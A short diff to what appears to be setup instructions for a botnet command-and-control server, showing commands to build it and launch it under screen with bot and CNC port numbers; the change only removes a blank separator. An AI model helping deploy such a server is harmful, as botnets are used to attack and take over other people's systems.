@@ -3,8 +3,6 @@
 - Run this:
 sh buildcnc.sh
 -------------------------
-
--------------------------
 screen ./server <botport> <threads> <cncport>
 -------------------------
 example: screen ./server 1338 10 1337
